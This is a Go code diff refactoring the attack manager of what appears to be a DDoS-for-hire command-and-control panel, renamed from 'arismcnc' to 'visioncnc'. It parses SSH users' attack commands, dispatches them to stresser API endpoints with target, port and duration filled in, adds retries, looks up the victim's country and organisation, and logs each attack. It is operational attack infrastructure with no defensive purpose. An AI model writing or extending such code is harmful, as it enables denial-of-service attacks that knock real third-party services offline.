@@ -1,8 +1,6 @@
 package managers
 
 import (
-	"arismcnc/database"
-	"arismcnc/utils"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -10,30 +8,22 @@ import (
 	"log"
 	"net"
 	"net/http"
-	"os"
 	"strconv"
-	"strings"
 	"sync"
 	"time"
+	"visioncnc/database"
+	"visioncnc/utils"
 
 	"github.com/gliderlabs/ssh"
 )
 
-type MethodInfo struct {
-	defaultPort uint16
-	defaultTime uint32
-	MinTime     uint32
-	MaxTime     uint32
-}
-
 // Attack holds the parameters for an attack request
 type Attack struct {
 	Duration   uint32
-	Type       uint8
 	Target     string
 	Port       string
 	MethodName string
-	API        []string
+	Method     utils.Method
 	Enabled    bool
 }
 
@@ -59,15 +49,11 @@ func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin
 		return nil, errors.New("Admin permission required for this method")
 	}
 
-	atkInfo := MethodInfo{
-		defaultPort: method.DefaultPort,
-		defaultTime: method.DefaultTime,
-		MinTime:     method.MinTime,
-		MaxTime:     method.MaxTime,
-	}
 	atk := &Attack{
 		MethodName: args[0],
 		Target:     args[1],
+		Method:     method,
+		Enabled:    method.Enabled,
 	}
 
 	port, err := strconv.Atoi(args[2])
@@ -77,120 +63,86 @@ func NewAttack(session ssh.Session, args []string, vip bool, private bool, admin
 	atk.Port = strconv.Itoa(port)
 
 	duration, err := strconv.Atoi(args[3])
-	if err != nil || uint32(duration) < atkInfo.MinTime || uint32(duration) > atkInfo.MaxTime || duration > maxtime {
-		return nil, fmt.Errorf("Invalid duration. Must be between %d and %d seconds", atkInfo.MinTime, atkInfo.MaxTime)
+	if err != nil || uint32(duration) < method.MinTime || uint32(duration) > method.MaxTime || duration > maxtime {
+		return nil, fmt.Errorf("Invalid duration. Must be between %d and %d seconds", method.MinTime, method.MaxTime)
 	}
 	atk.Duration = uint32(duration)
-	atk.API = method.API
-	atk.Enabled = method.Enabled
 
 	return atk, nil
 }
 
-// Build sends the attack to all configured API endpoints and returns branding message
+// Build sends the attack to API endpoints and returns the branding message.
 func (this *Attack) Build(session ssh.Session, db *database.Database, config *utils.Config) (bool, error, string) {
 	userInfo := db.GetAccountInfo(session.User())
-	apiList := this.API
 
 	if !this.Enabled {
 		return false, errors.New("Method not enabled"), ""
 	}
 
+	// Select API endpoints based on api_mode
+	selected := utils.SelectAPIs(this.MethodName, this.Method.ApiMode, this.Method.API)
+
+	// Determine HTTP timeout
+	timeout := 2 * time.Second
+	if this.Method.ApiTimeout > 0 {
+		timeout = time.Duration(this.Method.ApiTimeout) * time.Second
+	}
+
 	// Send API requests in background
 	go func() {
-		responses := make(chan string, len(apiList))
 		client := &http.Client{
 			Transport: &http.Transport{
-				MaxIdleConns:        1000,
-				MaxIdleConnsPerHost: 1000,
+				MaxIdleConns:        100,
+				MaxIdleConnsPerHost: 100,
 				IdleConnTimeout:     30 * time.Second,
 			},
-			Timeout: 2 * time.Second,
+			Timeout: timeout,
 		}
 
 		var wg sync.WaitGroup
-		sem := make(chan struct{}, 1000)
-
-		for _, apiLink := range apiList {
-			finalLink := replacePlaceholders(apiLink, this.MethodName, this.Target, this.Port, this.Duration)
+		for _, entry := range selected {
+			finalURL := utils.ReplacePlaceholders(entry.URL, this.MethodName, this.Target, this.Port, this.Duration)
 			wg.Add(1)
-			go func(link string) {
+			go func(url, label string) {
 				defer wg.Done()
-				sem <- struct{}{}
-				defer func() { <-sem }()
-
-				res, err := client.Get(link)
-				if err != nil {
-					log.Printf("[ATTACK] Error sending request to: %s - %v", link, err)
-					responses <- fmt.Sprintf("[ATTACK] %s response: error", link)
-					return
+				maxAttempts := 1 + this.Method.ApiRetry
+				for attempt := 0; attempt < maxAttempts; attempt++ {
+					res, err := client.Get(url)
+					if err != nil {
+						utils.RecordAPIError(url, label)
+						log.Printf("[ATTACK] Error on %s (attempt %d): %v", label, attempt+1, err)
+						continue
+					}
+					io.Copy(io.Discard, res.Body)
+					res.Body.Close()
+					utils.RecordAPISuccess(url, label)
+					log.Printf("[ATTACK] %s → sent (HTTP %d)", label, res.StatusCode)
+					break
 				}
-				defer res.Body.Close()
-				io.Copy(io.Discard, res.Body)
-				responses <- fmt.Sprintf("[ATTACK] %s response: sent", link)
-			}(finalLink)
+			}(finalURL, entry.Label)
 		}
-
 		wg.Wait()
-		close(responses)
-		log.Printf("[INFO] Attack to %d API endpoints completed", len(apiList))
+		log.Printf("[INFO] Attack dispatched to %d endpoint(s)", len(selected))
 	}()
 
 	// Fetch target ASN info
-	type IpApiResult struct {
-		Country string `json:"country"`
-		Org     string `json:"organization"`
-		Region  string `json:"region"`
-	}
-	type IpInfoResult struct {
-		Country string `json:"country"`
-		Org     string `json:"org"`
-		Region  string `json:"region"`
-	}
+	dataMap := fetchASNInfoC2(this.Target, config)
 
-	var url string
-	var data interface{}
-	var dataMap map[string]string
-
-	if strings.Contains(this.Target, "http") || strings.Contains(this.Target, "www") {
-		url = "http://" + config.ProxyURL + "/?ip=" + this.Target
-		data = &IpApiResult{}
-	} else {
-		url = "https://ipinfo.io/" + this.Target + "/json?token=" + config.IpinfoToken
-		data = &IpInfoResult{}
-	}
-
-	client := &http.Client{Timeout: 3 * time.Second}
-	asninfo, err := client.Get(url)
-	if err != nil {
-		log.Println("[!] Failed to retrieve ASN info:", err)
-		dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
-	} else {
-		defer asninfo.Body.Close()
-		content, err := io.ReadAll(asninfo.Body)
-		if err != nil {
-			log.Println("[!] Failed to read ASN info response:", err)
-			dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
-		} else {
-			json.Unmarshal(content, data)
-			switch v := data.(type) {
-			case *IpApiResult:
-				dataMap = map[string]string{"country": v.Country, "org": v.Org, "region": v.Region}
-			case *IpInfoResult:
-				dataMap = map[string]string{"country": v.Country, "org": v.Org, "region": v.Region}
-			default:
-				dataMap = map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
-			}
-		}
-	}
-
-	// Log attack
-	lm, err := NewLogManager("./assets/logs/logs.json")
-	if err != nil {
-		log.Printf("Error initializing LogManager: %v", err)
-	} else {
-		defer lm.Close()
-		lm.Log("New Attack (C2)!\nUsername: " + session.User() + "\nTarget: " + this.Target + "\nPort: " + this.Port + "\nTime: " + strconv.Itoa(int(this.Duration)) + "\nMethod: " + this.MethodName + "\n----------------------")
+	// Log attack event
+	lm := GetSharedLogManager()
+	if lm != nil {
+		lm.LogEvent("attack_sent", map[string]string{
+			"source":   "C2",
+			"username": session.User(),
+			"target":   this.Target,
+			"port":     this.Port,
+			"time":     strconv.Itoa(int(this.Duration)),
+			"method":   this.MethodName,
+			"layer":    this.Method.Group,
+			"country":  dataMap["country"],
+			"org":      dataMap["org"],
+			"region":   dataMap["region"],
+		})
 	}
 
 	// Build attack-sent branding message
@@ -225,16 +177,43 @@ func (this *Attack) Build(session ssh.Session, db *database.Database, config *ut
 	return false, nil, sentMessage
 }
 
-func replacePlaceholders(apiLink string, method string, target string, port string, duration uint32) string {
-	apiLink = strings.ReplaceAll(apiLink, "{host}", target)
-	apiLink = strings.ReplaceAll(apiLink, "{port}", port)
-	apiLink = strings.ReplaceAll(apiLink, "{time}", strconv.Itoa(int(duration)))
-	apiLink = strings.ReplaceAll(apiLink, "{method}", method)
-	apiLink = strings.ReplaceAll(apiLink, "<<$host>>", target)
-	apiLink = strings.ReplaceAll(apiLink, "<<$port>>", port)
-	apiLink = strings.ReplaceAll(apiLink, "<<$time>>", strconv.Itoa(int(duration)))
-	apiLink = strings.ReplaceAll(apiLink, "<<$method>>", method)
-	return apiLink
+// fetchASNInfoC2 retrieves country/org/region for a target IP or URL.
+func fetchASNInfoC2(target string, config *utils.Config) map[string]string {
+	unknown := map[string]string{"country": "Unknown", "org": "Unknown", "region": "Unknown"}
+
+	var apiURL string
+	if len(target) > 4 && (target[:7] == "http://" || target[:4] == "www.") {
+		apiURL = "http://" + config.ProxyURL + "/?ip=" + target
+	} else {
+		apiURL = "https://ipinfo.io/" + target + "/json?token=" + config.IpinfoToken
+	}
+
+	client := &http.Client{Timeout: 3 * time.Second}
+	resp, err := client.Get(apiURL)
+	if err != nil {
+		log.Println("[!] Failed to retrieve ASN info:", err)
+		return unknown
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return unknown
+	}
+
+	var result struct {
+		Country string `json:"country"`
+		Org     string `json:"org"`
+		Region  string `json:"region"`
+	}
+	if json.Unmarshal(body, &result) != nil {
+		return unknown
+	}
+	return map[string]string{
+		"country": result.Country,
+		"org":     result.Org,
+		"region":  result.Region,
+	}
 }
 
 // Contains checks if a method name exists in the methods list
@@ -251,6 +230,3 @@ func Contains(methods []utils.Method, s string) bool {
 func ValidIP4(s string) bool {
 	return net.ParseIP(s) != nil
 }
-
-// Ensure os import is used
-var _ = os.Exit
